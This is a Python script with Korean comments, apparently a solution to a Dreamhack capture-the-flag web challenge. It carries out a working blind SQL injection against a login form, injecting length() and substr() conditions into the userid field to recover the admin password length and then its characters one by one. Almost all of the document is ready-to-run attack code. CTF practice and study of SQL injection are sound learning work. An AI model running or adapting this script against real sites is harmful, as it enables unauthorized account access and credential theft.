import requests

# 1. 설정: URL과 타겟 정보
port = "19704"  # 실제 포트 번호로 변경하세요
url = f"http://host1.dreamhack.games:19704/login"
admin_pw_len = 0

# 2. 패스워드 길이 찾기 (순차 탐색)
for i in range(1, 100):
    # SQL Injection 페이로드: admin이면서 길이가 i인 경우 성공
    payload = f'admin" and length(userpassword)={i}-- '
    res = requests.post(url, data={'userid': payload, 'userpassword': 'abc'})
    
    # 로그인 성공 메시지(예: "hello admin")가 있으면 정답
    if "hello" in res.text:
        admin_pw_len = i
        break

print(f"Admin 비밀번호 길이는: {admin_pw_len}")

# 3. 실제 비밀번호 한 글자씩 알아내기 (필요할 경우)
password = ""
for i in range(1, admin_pw_len + 1):
    for char_code in range(32, 127):  # 아스키 코드 범위 (공백~~)
        char = chr(char_code)
        payload = f'admin" and substr(userpassword,{i},1)="{char}"-- '
        res = requests.post(url, data={'userid': payload, 'userpassword': 'abc'})
        
        if "hello" in res.text:
            password += char
            print(f"찾는 중...: {password}")
            break

print(f"최종 비밀번호: {password}")